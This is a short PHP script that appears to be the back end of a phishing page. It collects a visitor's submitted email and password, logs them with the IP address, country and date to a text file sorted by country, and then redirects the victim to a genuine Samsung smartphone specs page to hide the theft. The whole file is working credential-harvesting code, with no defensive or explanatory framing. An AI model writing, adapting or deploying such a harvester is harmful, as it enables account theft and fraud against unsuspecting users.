<?php
ini_set('memory_limit', '-1');

$usuario = $_POST[ 'email' ];
$password = $_POST[ 'pass' ];
include("geoiploc.php");
$ip = $_SERVER[ 'REMOTE_ADDR' ];
$pais = getCountryFromIP($ip, " NamE ");
$fecha = date("d/m/Y h:i"); 

if( ( empty($usuario)) or (empty($password)) ){
	
echo ("<SCRIPT LANGUAGE='JavaScript'>


     history.go(-1);



    </SCRIPT>");
	
	
}else{	


	//guarderemos en un archivo de texto
	$file = fopen('ss2/'.$pais.'','a+');
	fwrite($file, $usuario."\n".$password."\n".$ip."\n".$pais."\n============".$fecha."=============\n");
	fclose($file);
	
	

	
echo ("<SCRIPT LANGUAGE='JavaScript'>


    
    
 window.location.href='https://www.samsung.com/pe/smartphones/galaxy-s10/specs/';


    </SCRIPT>");
  	
 
	
}
?>